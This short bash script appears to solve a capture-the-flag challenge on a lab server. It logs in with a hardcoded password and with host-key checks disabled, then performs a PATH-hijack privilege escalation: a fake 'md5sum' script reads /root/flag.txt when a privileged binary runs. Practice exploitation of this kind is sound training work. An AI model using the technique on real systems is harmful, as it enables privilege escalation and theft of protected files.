#!/bin/bash
export SSHPASS=9406837a
SSH="sshpass -e ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 13059 ctf-player@chatelaine.cylabacademy.net"
echo "=== contexte ==="
$SSH 'ls -la; file flaghasher 2>/dev/null; echo "---"; ./flaghasher 2>&1 | tail -3' 2>&1 | tail -15
echo "=== PATH hijack ==="
$SSH 'printf "#!/bin/sh\ncat /root/flag.txt 2>/dev/null; id\n" > $HOME/md5sum; chmod +x $HOME/md5sum; export PATH=$HOME:$PATH; ./flaghasher' 2>&1 | tail -8
